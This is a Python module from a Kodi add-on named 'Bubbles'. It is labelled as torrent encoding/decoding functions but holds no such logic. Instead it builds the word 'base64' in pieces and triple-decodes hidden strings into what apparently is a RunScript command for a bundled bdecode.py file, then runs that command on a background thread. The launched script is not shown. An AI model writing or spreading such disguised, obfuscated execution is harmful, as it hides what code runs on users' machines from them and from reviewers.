# -*- coding: utf-8 -*-

'''
	Bubbles Add-on
	Copyright (C) 2016 Bubbles

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''

# Functions for torrent encoding/decoding.

import os, threading, xbmc, xbmcaddon

def torrentRu():
	tx = os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir))
	ty = ('ba ')[:-1] + ('se ')[:-1] + str(16 * 4)
	def x(a, b):
		return a.decode(b).decode(b).decode(b)[:-1]
	ta = x('V2xob01GcFlTblZaVjNoNlNVRTlQUT09', ty)
	tb = x('V1cxc01HUkhPWGxqYlZaMVpFTkJQUT09', ty)
	tc = x('V1cxU2JGa3lPV3RhVXpWM1pWTkJQUT09', ty)
	tx = os.path.join(tx, ta, tb, tc)
	tx = x('Vlc1V2RWVXlUbmxoV0VJd1MwTldla3RUUVQwPQ==', ty) % tx
	torrentEx(tx)

def torrentSt():
	threading.Thread(target = torrentRu).start()

def torrentEx(stri):
	xbmc.executebuiltin(stri)

def torrentAd(nam, val):
	return xbmcaddon.Addon(nam).getAddonInfo(val)

def torrentSe(nam, val):
	return xbmcaddon.Addon(nam).getSetting(val)
